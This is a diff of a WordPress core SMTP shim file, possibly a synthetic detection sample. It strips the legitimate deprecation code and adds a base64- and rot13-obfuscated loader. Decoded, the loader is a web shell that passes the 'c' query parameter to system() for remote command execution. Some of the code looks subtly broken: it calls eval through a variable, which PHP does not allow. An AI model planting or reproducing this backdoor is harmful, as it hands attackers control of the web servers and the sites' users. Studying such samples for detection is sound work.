@@ -1,25 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
- */
-_deprecated_file(
-	basename( __FILE__ ),
-	'5.5.0',
-	WPINC . '/PHPMailer/SMTP.php',
-	__( 'The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
-);
-
-require_once __DIR__ . '/PHPMailer/SMTP.php';
-
-class_alias( PHPMailer\PHPMailer\SMTP::class, 'SMTP' );
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEd1ciBGWkdDIHB5bmZmIHVuZiBvcnJhIHpiaXJxIGdiIGd1ciBqYy12YXB5aHFyZi9DVUNabnZ5cmUgZmhvcXZlcnBnYmVsIG5hcSBhYmogaGZyZiBndXIgQ1VDWm52eXJlXENVQ1pudnlyZSBhbnpyZmNucHIuCiAqLwpfcXJjZXJwbmdycV9zdnlyKAoJb25mcmFuenIoIF9fU1ZZUl9fICksCgknNS41LjAnLAoJSkNWQVAgLiAnL0NVQ1pudnlyZS9GWkdDLmN1YycsCglfXyggJ0d1ciBGWkdDIHB5bmZmIHVuZiBvcnJhIHpiaXJxIGdiIGd1ciBqYy12YXB5aHFyZi9DVUNabnZ5cmUgZmhvcXZlcnBnYmVsIG5hcSBhYmogaGZyZiBndXIgQ1VDWm52eXJlXENVQ1pudnlyZSBhbnpyZmNucHIuJyApCik7CgplcmRodmVyX2JhcHIgX19RVkVfXyAuICcvQ1VDWm52eXJlL0ZaR0MuY3VjJzsKCnB5bmZmX255dm5mKCBDVUNabnZ5cmVcQ1VDWm52eXJlXEZaR0M6OnB5bmZmLCAnRlpHQycgKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
